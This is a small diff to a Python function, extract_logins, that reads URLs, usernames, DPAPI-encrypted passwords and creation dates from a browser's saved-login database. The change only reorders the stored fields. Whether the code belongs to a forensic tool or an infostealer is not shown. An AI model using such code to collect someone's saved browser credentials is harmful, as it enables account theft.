@@ -20,13 +20,12 @@ def extract_logins(browser, files, user_profile):
 
             for row in cursor.fetchall():
                 url, username, encrypted_password, date_created = row
-
                 # Password is encrypted (DPAPI)
                 logins.append([
-                    url,
+                    convert_webkit_time(date_created),
                     username,
                     encrypted_password,  # raw encrypted
-                    convert_webkit_time(date_created)
+                    url
                 ])
 
             conn.close()
